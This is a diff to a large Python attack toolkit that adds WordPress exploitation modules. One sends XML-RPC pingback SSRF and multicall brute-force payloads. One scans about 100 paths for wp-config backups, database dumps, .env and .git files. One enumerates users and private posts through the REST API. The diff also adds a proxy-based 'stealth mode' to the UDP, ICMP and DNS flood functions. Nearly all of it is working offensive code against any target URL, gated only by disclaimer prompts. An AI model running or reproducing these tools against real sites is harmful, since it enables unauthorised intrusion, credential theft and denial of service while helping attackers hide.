+                sys.stdout.flush()
+                time.sleep(0.2)
+
+    print()
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Combinations tested", str(tested))
+    print_row("Credentials found", str(len(found_creds)))
+    if found_creds:
+        print(f"\n  {R}[!] Valid credentials:{RST}")
+        for u, p in found_creds:
+            print(f"      {R}•{RST} {u} : {p}")
+    else:
+        print_ok("No valid credentials found with the tested combinations.")
+
+
+# ─── 53. WP XML-RPC Exploiter ────────────────────────────────────────────────
+
+WP_XMLRPC_RISK_MAP = {
+    "pingback.ping": ("HIGH", "SSRF / DDoS amplification — can probe internal hosts and amplify attacks"),
+    "pingback.extensions.getPingbacks": ("LOW", "Information disclosure — list of pingbacks"),
+    "system.multicall": ("HIGH", "Brute-force amplification — test many credentials in one request"),
+    "system.listMethods": ("INFO", "Method enumeration — reveals available attack surface"),
+    "system.getCapabilities": ("INFO", "Capability disclosure"),
+    "wp.getUsersBlogs": ("MEDIUM", "Credential validation — can confirm valid username/password"),
+    "wp.getUsers": ("HIGH", "User enumeration (requires auth) — lists all user accounts"),
+    "wp.getAuthors": ("MEDIUM", "Author enumeration (requires auth)"),
+    "wp.getCategories": ("LOW", "Category listing"),
+    "wp.getTags": ("LOW", "Tag listing"),
+    "wp.getPages": ("MEDIUM", "Page listing (may expose private pages)"),
+    "wp.getPosts": ("MEDIUM", "Post listing (may expose drafts)"),
+    "wp.getOptions": ("HIGH", "Configuration disclosure (requires auth)"),
+    "wp.getMediaItem": ("LOW", "Media enumeration"),
+    "wp.getComments": ("LOW", "Comment listing"),
+    "wp.newPost": ("CRITICAL", "Content creation (requires auth)"),
+    "wp.editPost": ("CRITICAL", "Content modification (requires auth)"),
+    "wp.deletePost": ("CRITICAL", "Content deletion (requires auth)"),
+    "wp.uploadFile": ("CRITICAL", "File upload (requires auth) — potential RCE"),
+    "wp.newComment": ("MEDIUM", "Comment creation — spam vector"),
+    "metaWeblog.newPost": ("CRITICAL", "Legacy post creation (requires auth)"),
+    "metaWeblog.getPost": ("MEDIUM", "Legacy post retrieval"),
+    "metaWeblog.getUsersBlogs": ("MEDIUM", "Legacy credential validation"),
+    "blogger.getUsersBlogs": ("MEDIUM", "Legacy Blogger credential validation"),
+}
+
+
+def wp_xmlrpc_exploit():
+    print_header("WP XML-RPC Exploiter")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target WordPress URL")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+    xmlrpc_url = f"{url}/xmlrpc.php"
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+    # 1. Check if XML-RPC is available
+    spinner("Checking XML-RPC endpoint...", 0.5)
+    try:
+        resp = session.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
+                            headers={"Content-Type": "text/xml"}, timeout=10)
+        if resp.status_code != 200 or "methodResponse" not in resp.text:
+            print_err("XML-RPC is not available or is blocked on this target.")
+            return
+    except Exception as e:
+        print_err(f"Cannot reach XML-RPC: {e}")
+        return
+
+    print_ok("XML-RPC endpoint is active!")
+
+    # 2. Enumerate methods with risk analysis
+    print(f"\n  {M}── Method Enumeration & Risk Analysis ──{RST}\n")
+    methods = re.findall(r"<string>(.*?)</string>", resp.text)
+    print_row("Total methods", str(len(methods)))
+    print()
+
+    risk_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+    risk_colors = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C, "INFO": W}
+
+    for method in sorted(methods):
+        if method in WP_XMLRPC_RISK_MAP:
+            risk, desc = WP_XMLRPC_RISK_MAP[method]
+            clr = risk_colors[risk]
+            print(f"    {clr}[{risk:<8}]{RST} {method:<40} {W}{desc}{RST}")
+            risk_counts[risk] += 1
+        else:
+            print(f"    {W}[UNKNOWN]{RST}  {method}")
+
+    print(f"\n  {Y}Risk summary:{RST}")
+    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
+        if risk_counts[level]:
+            clr = risk_colors[level]
+            print(f"    {clr}{level}: {risk_counts[level]}{RST}")
+
+    # 3. Test pingback SSRF
+    print(f"\n  {M}── Pingback SSRF Test ──{RST}\n")
+    if "pingback.ping" in methods:
+        # Try to make the server call back to a canary URL
+        pingback_payload = (
+            '<?xml version="1.0"?>'
+            '<methodCall><methodName>pingback.ping</methodName><params>'
+            f'<param><value><string>http://127.0.0.1:80/</string></value></param>'
+            f'<param><value><string>{url}/?p=1</string></value></param>'
+            '</params></methodCall>'
+        )
+        try:
+            resp = session.post(xmlrpc_url, data=pingback_payload,
+                                headers={"Content-Type": "text/xml"}, timeout=10)
+            if "faultCode" in resp.text:
+                fault = re.search(r"<int>(\d+)</int>", resp.text)
+                fault_code = fault.group(1) if fault else "?"
+                if fault_code == "0":
+                    print(f"    {R}[VULN]{RST} Pingback accepted — server may be usable as SSRF proxy!")
+                elif fault_code in ("17", "48"):
+                    print(f"    {Y}[PARTIAL]{RST} Pingback processed but target rejected (code {fault_code})")
+                    print(f"           {W}Server still made an outbound request — SSRF confirmed!{RST}")
+                else:
+                    print(f"    {Y}[INFO]{RST} Pingback returned fault code {fault_code}")
+            else:
+                print(f"    {R}[VULN]{RST} Pingback did NOT return a fault — likely vulnerable to SSRF!")
+        except Exception as e:
+            print(f"    {Y}[ERR]{RST}  Pingback test failed: {e}")
+    else:
+        print_ok("pingback.ping method not available — SSRF not possible via XML-RPC")
+
+    # 4. Test system.multicall abuse
+    print(f"\n  {M}── Multicall Brute-Force Amplification Test ──{RST}\n")
+    if "system.multicall" in methods:
+        multicall_test = (
+            '<?xml version="1.0"?>'
+            '<methodCall><methodName>system.multicall</methodName>'
+            '<params><param><value><array><data>'
+            '<value><struct>'
+            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+            '<member><name>params</name><value><array><data>'
+            '<value><string>test_user</string></value>'
+            '<value><string>test_pass_1</string></value>'
+            '</data></array></value></member>'
+            '</struct></value>'
+            '<value><struct>'
+            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
+            '<member><name>params</name><value><array><data>'
+            '<value><string>test_user</string></value>'
+            '<value><string>test_pass_2</string></value>'
+            '</data></array></value></member>'
+            '</struct></value>'
+            '</data></array></value></param></params></methodCall>'
+        )
+        try:
+            resp = session.post(xmlrpc_url, data=multicall_test,
+                                headers={"Content-Type": "text/xml"}, timeout=10)
+            if resp.status_code == 200 and "methodResponse" in resp.text:
+                print(f"    {R}[VULN]{RST} system.multicall accepts batched auth requests!")
+                print(f"           {W}Attacker can test hundreds of passwords in a single HTTP request.{RST}")
+            else:
+                print(f"    {G}[SAFE]{RST} system.multicall appears restricted")
+        except Exception as e:
+            print(f"    {Y}[ERR]{RST}  Multicall test failed: {e}")
+    else:
+        print_ok("system.multicall not available")
+
+    # 5. Test wp.getUsersBlogs info leak
+    print(f"\n  {M}── wp.getUsersBlogs Info Leak Test ──{RST}\n")
+    if "wp.getUsersBlogs" in methods:
+        getblogs_payload = (
+            '<?xml version="1.0"?>'
+            '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
+            '<param><value><string>admin</string></value></param>'
+            '<param><value><string>wrongpassword</string></value></param>'
+            '</params></methodCall>'
+        )
+        try:
+            resp = session.post(xmlrpc_url, data=getblogs_payload,
+                                headers={"Content-Type": "text/xml"}, timeout=10)
+            if "403" in resp.text or "Incorrect username" in resp.text:
+                print(f"    {Y}[INFO]{RST} Error response leaks whether username 'admin' exists")
+                if "Incorrect username" in resp.text:
+                    print(f"           {W}Response says 'Incorrect username' — user 'admin' does NOT exist{RST}")
+                elif "incorrect_password" in resp.text.lower() or "Incorrect password" in resp.text:
+                    print(f"           {R}Response says 'Incorrect password' — user 'admin' EXISTS!{RST}")
+            elif "faultString" in resp.text:
+                fault_str = re.search(r"<string>(.*?)</string>", resp.text.split("faultString")[1])
+                msg = fault_str.group(1) if fault_str else "unknown"
+                print(f"    {Y}[INFO]{RST} Error: {msg}")
+        except Exception as e:
+            print(f"    {Y}[ERR]{RST}  Test failed: {e}")
+    else:
+        print_ok("wp.getUsersBlogs not available")
+
+    print(f"\n  {Y}{'═' * 50}{RST}")
+
+
+# ─── 54. WP Config & Backup Finder ───────────────────────────────────────────
+
+WP_BACKUP_PATHS = [
+    # wp-config backups
+    "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php.orig",
+    "/wp-config.php.save", "/wp-config.php.txt", "/wp-config.php~",
+    "/wp-config.bak", "/wp-config.old", "/wp-config.txt",
+    "/wp-config.php.swp", "/wp-config.php.swo", "/.wp-config.php.swp",
+    "/wp-config.php.zip", "/wp-config.php.tar.gz", "/wp-config.php.dist",
+    "/wp-config-sample.php", "/wp-config.php_bak", "/wp-config.php.backup",
+    "/wp-config.php.1", "/wp-config.php.2", "/wp-config.copy.php",
+    # Database backups
+    "/backup.sql", "/backup.sql.gz", "/backup.sql.zip", "/backup.sql.bak",
+    "/database.sql", "/database.sql.gz", "/db.sql", "/db.sql.gz",
+    "/dump.sql", "/dump.sql.gz", "/data.sql", "/export.sql",
+    "/mysql.sql", "/site.sql", "/wordpress.sql", "/wp.sql",
+    "/backup.mysql", "/backup.mysql.gz",
+    "/.sql", "/sql.sql",
+    # Archive backups
+    "/backup.zip", "/backup.tar.gz", "/backup.tar", "/backup.rar",
+    "/site.zip", "/site.tar.gz", "/wp-backup.zip", "/wp-backup.tar.gz",
+    "/wordpress.zip", "/wordpress.tar.gz",
+    "/www.zip", "/www.tar.gz", "/html.zip", "/html.tar.gz",
+    "/public_html.zip", "/httpdocs.zip",
+    "/web.zip", "/website.zip", "/full-backup.zip",
+    # Plugin backup locations
+    "/wp-content/backups/", "/wp-content/backup/",
+    "/wp-content/uploads/backups/", "/wp-content/uploads/backup/",
+    "/wp-content/updraft/", "/wp-content/uploads/updraft/",
+    "/wp-content/backups-dup-lite/", "/wp-content/backups-dup-pro/",
+    "/wp-content/uploads/backupbuddy_backups/",
+    "/wp-content/uploads/wp-clone/",
+    "/wp-content/ai1wm-backups/",
+    "/wp-content/uploads/duplicator/",
+    "/wp-content/uploads/backwpup/",
+    "/wp-content/backup-db/",
+    "/wp-content/w3tc-config/",
+    "/wp-snapshots/",
+    # Debug & log files
+    "/wp-content/debug.log", "/debug.log", "/error_log", "/error.log",
+    "/wp-content/uploads/debug.log",
+    "/php_errorlog", "/php-errors.log",
+    # Other sensitive files
+    "/.htaccess.bak", "/.htaccess.old", "/.htaccess.save",
+    "/.htpasswd", "/htpasswd", "/htpasswd.bak",
+    "/.env", "/.env.bak", "/.env.local", "/.env.production",
+    "/phpinfo.php", "/info.php", "/test.php",
+    "/.git/HEAD", "/.git/config", "/.svn/entries",
+    "/composer.json", "/composer.lock",
+]
+
+
+def wp_backup_finder():
+    print_header("WP Config & Backup Finder")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target WordPress URL")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+    spinner(f"Scanning {len(WP_BACKUP_PATHS)} backup/config paths...", 1.0)
+
+    accessible = []
+    forbidden = []
+    redirects = []
+
+    def check_backup(path):
+        try:
+            test_url = f"{url}{path}"
+            r = session.get(test_url, timeout=6, allow_redirects=False)
+            return path, r.status_code, len(r.content), r.text[:300]
+        except Exception:
+            return path, 0, 0, ""
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
+        futures = [pool.submit(check_backup, p) for p in WP_BACKUP_PATHS]
+        for future in concurrent.futures.as_completed(futures):
+            path, code, size, preview = future.result()
+            if code == 200 and size > 0:
+                risk = ""
+                lp = preview.lower()
+                if any(k in lp for k in ["db_password", "db_user", "db_host", "db_name",
+                                          "auth_key", "secure_auth", "nonce_key",
+                                          "table_prefix", "password", "secret"]):
+                    risk = f" {R}[SENSITIVE DATA EXPOSED!]{RST}"
+                elif any(k in lp for k in ["create table", "insert into", "drop table"]):
+                    risk = f" {R}[DATABASE DUMP!]{RST}"
+                elif "index of" in lp:
+                    risk = f" {Y}[DIRECTORY LISTING]{RST}"
+
+                # Skip false positives (HTML error pages)
+                if size < 100 and "<!doctype" in lp:
+                    continue
+                if "<html" in lp and "404" in lp and size < 2000:
+                    continue
+
+                print(f"    {R}[FOUND]{RST} {path:<50} {G}{size:>8} bytes{RST}{risk}")
+                accessible.append((path, size, risk))
+            elif code == 403:
+                print(f"    {Y}[403]{RST}  {path:<50} (exists but forbidden)")
+                forbidden.append(path)
+            elif code in (301, 302):
+                redirects.append(path)
+
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Accessible files", str(len(accessible)))
+    print_row("Forbidden (exist)", str(len(forbidden)))
+    print_row("Redirects", str(len(redirects)))
+
+    if accessible:
+        total_size = sum(s for _, s, _ in accessible)
+        print_row("Total exposed data", f"{total_size:,} bytes")
+        sensitive = [p for p, _, r in accessible if "SENSITIVE" in r or "DATABASE" in r]
+        if sensitive:
+            print(f"\n  {R}[!!!] CRITICAL: {len(sensitive)} file(s) with sensitive data exposed!{RST}")
+            for p in sensitive:
+                print(f"       {R}•{RST} {url}{p}")
+
+
+# ─── 55. WP REST API Exploiter ───────────────────────────────────────────────
+
+def wp_rest_api_exploit():
+    print_header("WP REST API Exploiter")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target WordPress URL")
+    if not url:
+        return
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+    # 1. Discover REST API root
+    spinner("Discovering REST API...", 0.5)
+    api_base = f"{url}/wp-json"
+    try:
+        resp = session.get(api_base, timeout=10)
+        if resp.status_code != 200:
+            # Try alternative
+            resp = session.get(f"{url}/?rest_route=/", timeout=10)
+            if resp.status_code == 200:
+                api_base = f"{url}/?rest_route="
+                print_ok(f"REST API found via ?rest_route= (wp-json may be blocked)")
+            else:
+                print_err("REST API does not appear to be accessible.")
+                return
+        else:
+            print_ok("REST API is accessible at /wp-json")
+    except Exception as e:
+        print_err(f"Cannot reach target: {e}")
+        return
+
+    # 2. Enumerate available namespaces/routes
+    print(f"\n  {M}── Available API Namespaces ──{RST}\n")
+    try:
+        data = resp.json()
+        namespaces = data.get("namespaces", [])
+        routes = data.get("routes", {})
+        site_name = data.get("name", "N/A")
+        site_desc = data.get("description", "N/A")
+        site_url = data.get("url", "N/A")
+        gmt_offset = data.get("gmt_offset", "N/A")
+        timezone = data.get("timezone_string", "N/A")
+
+        print_row("Site name", site_name)
+        print_row("Description", site_desc)
+        print_row("URL", site_url)
+        print_row("Timezone", f"{timezone} (GMT {gmt_offset})")
+        print_row("Namespaces", str(len(namespaces)))
+        print_row("Routes", str(len(routes)))
+        print()
+        for ns in namespaces:
+            print(f"    {C}•{RST} {ns}")
+    except Exception:
+        print_warn("Could not parse REST API response as JSON")
+        namespaces = []
+        routes = {}
+
+    # 3. User enumeration
+    print(f"\n  {M}── User Enumeration ──{RST}\n")
+    users_found = []
+    try:
+        # Try paginated user enumeration
+        page = 1
+        while page <= 10:
+            users_url = f"{api_base}/wp/v2/users?per_page=100&page={page}" if "rest_route" not in api_base else f"{api_base}/wp/v2/users&per_page=100&page={page}"
+            r = session.get(users_url, timeout=8)
+            if r.status_code != 200:
+                break
+            users = r.json()
+            if not isinstance(users, list) or not users:
+                break
+            for u in users:
+                uid = u.get("id", "?")
+                name = u.get("name", "N/A")
+                slug = u.get("slug", "N/A")
+                desc = u.get("description", "")
+                avatar = u.get("avatar_urls", {})
+                link = u.get("link", "")
+                users_found.append(u)
+                print(f"    {R}[USER]{RST} ID:{uid:<4} slug:{C}{slug:<20}{RST} name:{W}{name}{RST}")
+                if desc:
+                    print(f"            bio: {desc[:80]}")
+            page += 1
+        if not users_found:
+            print_ok("User enumeration is blocked or no users exposed")
+        else:
+            print(f"\n    {R}Total users enumerated: {len(users_found)}{RST}")
+    except Exception as e:
+        print_warn(f"User enumeration failed: {e}")
+
+    # 4. Try accessing private/draft posts
+    print(f"\n  {M}── Private/Draft Post Access ──{RST}\n")
+    try:
+        for status in ("private", "draft", "pending", "future"):
+            posts_url = f"{api_base}/wp/v2/posts?status={status}&per_page=5" if "rest_route" not in api_base else f"{api_base}/wp/v2/posts&status={status}&per_page=5"
+            r = session.get(posts_url, timeout=8)
+            if r.status_code == 200:
+                posts = r.json()
+                if isinstance(posts, list) and posts:
+                    print(f"    {R}[EXPOSED]{RST} {len(posts)} {status} post(s) accessible!")
+                    for p in posts[:3]:
+                        title = p.get("title", {}).get("rendered", "N/A")
+                        print(f"             • {title}")
+                else:
+                    print(f"    {G}[SAFE]{RST}    {status} posts: not accessible")
+            elif r.status_code == 401:
+                print(f"    {G}[SAFE]{RST}    {status} posts: requires authentication")
+            else:
+                print(f"    {W}[{r.status_code}]{RST}     {status} posts: HTTP {r.status_code}")
+    except Exception as e:
+        print_warn(f"Post access test failed: {e}")
+
+    # 5. Media/upload enumeration
+    print(f"\n  {M}── Media Enumeration ──{RST}\n")
+    try:
+        media_url = f"{api_base}/wp/v2/media?per_page=20" if "rest_route" not in api_base else f"{api_base}/wp/v2/media&per_page=20"
+        r = session.get(media_url, timeout=8)
+        if r.status_code == 200:
+            media = r.json()
+            if isinstance(media, list) and media:
+                print(f"    {Y}[INFO]{RST} {len(media)} media item(s) accessible")
+                for m in media[:5]:
+                    src = m.get("source_url", "N/A")
+                    mime = m.get("mime_type", "?")
+                    print(f"             {C}•{RST} [{mime}] {src}")
+                total_header = r.headers.get("X-WP-Total", "?")
+                print(f"    {Y}Total media items:{RST} {total_header}")
+            else:
+                print_ok("No media items accessible")
+        else:
+            print_ok("Media endpoint not accessible (requires auth)")
+    except Exception as e:
+        print_warn(f"Media enumeration failed: {e}")
+
+    # 6. Application Passwords check
+    print(f"\n  {M}── Application Passwords Endpoint ──{RST}\n")
+    try:
+        app_pwd_url = f"{api_base}/wp/v2/users/me/application-passwords" if "rest_route" not in api_base else f"{api_base}/wp/v2/users/me/application-passwords"
+        r = session.get(app_pwd_url, timeout=8)
+        if r.status_code == 200:
+            print(f"    {R}[VULN]{RST} Application Passwords endpoint accessible without auth!")
+        elif r.status_code == 401:
+            print(f"    {G}[SAFE]{RST} Application Passwords requires authentication")
+        else:
+            print(f"    {W}[{r.status_code}]{RST} Application Passwords endpoint returned HTTP {r.status_code}")
+    except Exception:
+        pass
+
+    # 7. Settings exposure check
+    print(f"\n  {M}── Settings Exposure ──{RST}\n")
+    try:
+        settings_url = f"{api_base}/wp/v2/settings" if "rest_route" not in api_base else f"{api_base}/wp/v2/settings"
+        r = session.get(settings_url, timeout=8)
+        if r.status_code == 200:
+            settings = r.json()
+            if isinstance(settings, dict) and settings:
+                print(f"    {R}[VULN]{RST} Site settings exposed without authentication!")
+                for k, v in list(settings.items())[:10]:
+                    print(f"             {C}{k}:{RST} {v}")
+        elif r.status_code == 401:
+            print(f"    {G}[SAFE]{RST} Settings require authentication")
+        else:
+            print(f"    {W}[{r.status_code}]{RST} Settings endpoint returned HTTP {r.status_code}")
+    except Exception:
+        pass
+
+    # 8. Check additional interesting endpoints
+    print(f"\n  {M}── Additional Endpoint Checks ──{RST}\n")
+    extra_endpoints = [
+        ("/wp/v2/search?search=admin", "Search API"),
+        ("/wp/v2/categories", "Categories"),
+        ("/wp/v2/tags", "Tags"),
+        ("/wp/v2/pages", "Pages"),
+        ("/wp/v2/comments", "Comments"),
+        ("/wp/v2/types", "Post types"),
+        ("/wp/v2/statuses", "Post statuses"),
+        ("/wp/v2/taxonomies", "Taxonomies"),
+        ("/wp-site-health/v1/tests/background-updates", "Site Health"),
+        ("/wp/v2/plugins", "Plugins (requires auth)"),
+        ("/wp/v2/themes", "Themes (requires auth)"),
+    ]
+    for endpoint, desc in extra_endpoints:
+        try:
+            ep_url = f"{api_base}{endpoint}" if "rest_route" not in api_base else f"{api_base}{endpoint}"
+            r = session.get(ep_url, timeout=6)
+            if r.status_code == 200:
+                try:
+                    data = r.json()
+                    count = len(data) if isinstance(data, list) else "object"
+                except Exception:
+                    count = "non-JSON"
+                print(f"    {G}[200]{RST}  {desc:<30} items: {count}")
+            elif r.status_code == 401:
+                print(f"    {W}[401]{RST}  {desc:<30} (auth required)")
+            elif r.status_code == 403:
+                print(f"    {Y}[403]{RST}  {desc:<30} (forbidden)")
+            else:
+                print(f"    {W}[{r.status_code}]{RST}  {desc}")
+        except Exception:
+            pass
+
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Users enumerated", str(len(users_found)))
+    print_row("API namespaces", str(len(namespaces)))
+    print_row("API routes", str(len(routes)))
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #                     STRESS TESTING / DoS MODULES
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -4675,6 +5934,8 @@ def tcp_flood():
 
 def udp_flood():
     print_header("UDP Flood")
+    if not _stealth_raw_socket_warning("UDP Flood"):
+        return
     if not stress_disclaimer():
         return
 
@@ -4757,6 +6018,8 @@ def udp_flood():
 
 def icmp_flood():
     print_header("ICMP Ping Flood")
+    if not _stealth_raw_socket_warning("ICMP Flood"):
+        return
     if not stress_disclaimer():
         return
 
@@ -5118,6 +6381,8 @@ def goldeneye():
 
 def dns_flood():
     print_header("DNS Flood")
+    if not _stealth_raw_socket_warning("DNS Flood"):
+        return
     if not stress_disclaimer():
         return
 
@@ -6692,8 +7957,14 @@ def show_menu():
                 right = " " * (7 + name_w)
             print(f"  {Y}║{RST}{left}{right}{Y}║{RST}")
 
+    if STEALTH["enabled"]:
+        stealth_tag = f"{G}STEALTH: ON via {STEALTH['proxy_type'].upper()}{RST}"
+    else:
+        stealth_tag = f"{R}STEALTH: OFF{RST}"
+
     print(f"\n  {Y}╔{'═' * w}╗{RST}")
     print(f"  {Y}║{W}{'MAIN MENU':^{w}}{Y}║{RST}")
+    print(f"  {Y}║{RST}  [{stealth_tag}]{'':>{w - 30}}{Y}║{RST}")
     _section("OSINT / RECONNAISSANCE", RECON_ITEMS, 1, C)
     _section("EXPLOITATION", EXPLOIT_ITEMS, len(RECON_ITEMS) + 1, R)
     _section("STRESS / DENIAL OF SERVICE", STRESS_ITEMS,
@@ -6701,6 +7972,7 @@ def show_menu():
     _section("PHISHING SIMULATION", PHISHING_ITEMS,
              len(RECON_ITEMS) + len(EXPLOIT_ITEMS) + len(STRESS_ITEMS) + 1, M)
     print(f"  {Y}╠{'═' * w}╣{RST}")
+    print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}╚{'═' * w}╝{RST}")
 
@@ -6717,6 +7989,10 @@ def main():
             print(f"\n  {R}Goodbye.{RST}\n")
             break
 
+        if choice.lower() == "s":
+            configure_stealth()
+            continue
+
         try:
             idx = int(choice) - 1
             if 0 <= idx < len(MENU_ITEMS):
@@ -6729,7 +8005,7 @@ def main():
             else:
                 print_err("Invalid option")
         except ValueError:
-            print_err("Enter a number")
+            print_err("Enter a number or 'S' for Stealth config")
 
 
 if __name__ == "__main__":
